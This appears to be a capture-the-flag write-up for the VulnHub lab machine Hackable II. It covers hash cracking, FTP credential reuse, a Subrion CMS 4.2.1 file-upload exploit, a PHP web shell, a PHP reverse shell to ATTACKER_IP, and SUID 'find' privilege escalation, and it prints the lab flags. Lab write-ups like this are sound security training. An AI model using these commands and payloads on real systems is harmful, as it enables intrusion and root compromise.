# Hackable II

## Overview

* Target: Hackable II
* Platform: VulnHub
* Focus: Web exploitation, credential reuse, privilege escalation

---

## Enumeration

Ran a full scan using Nmap:

```bash
nmap -T4 -sV -A -p- TARGET_IP
```

Found web services and FTP. The HTTPS service exposed an MD5 hash.

---

## Initial Access

Started by cracking the MD5 hash found on the site. It resolved to:

```
hostinger
```

Tried logging into FTP with:

```
hostinger : hostinger
```

and it worked.

Inside FTP, there was a file referencing a Vigenère cipher along with a key. Using the key `hostinger`, I decrypted the provided string and got credentials tied to the hint about “dora”.

---

Added the domain to `/etc/hosts`:

```
venom.box
```

Navigated to the site and found a login panel at `/panel/`. Logging in with the recovered credentials gave access to the admin dashboard.

The site was running **Subrion CMS v4.2.1**, which has known exploits. Using `searchsploit`, I found an arbitrary file upload exploit and ran it:

```bash
python3 49876.py -u http://venom.box/panel/ --user dora --passw <password>
```

This gave a basic shell, but it was limited.

---

While looking through the upload directory, I found a `.phar` file containing:

```php
<?php system($_GET['cmd']); ?>
```

This allowed command execution through the browser:

```
/uploads/<file>.phar?cmd=
```

Used that to trigger a reverse shell:

```bash
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
```

---

## User Access

After getting a shell, I reused the earlier credentials:

```
hostinger : hostinger
```

and was able to switch to that user.

In the home directory, `.bash_history` pointed to a backup file. Inside it (via `.htaccess`), I found another set of credentials:

```
nathan : <password>
```

Switched to nathan:

```bash
su nathan
```

Retrieved the user flag:

```
W3_@r3_V3n0m:P
```

---

## Privilege Escalation

Ran enumeration (linpeas) and found that `/usr/bin/find` had the SUID bit set.

Used it to escalate:

```bash
find . -exec /bin/bash -p \; -quit
```

This spawned a root shell.

Retrieved the root flag:

```
H@v3_a_n1c3_l1fe.
```

---

## Takeaways

* Always check for hashes or encoded data early—this one led directly to initial access
* FTP access can expose useful files that aren’t visible via the web interface
* After logging into a web app, checking the exact version and running `searchsploit` is often worth it
* Files like `.bash_history` and `.htaccess` are easy wins for credentials
* SUID binaries (like `find`) are a reliable privilege escalation vector

---
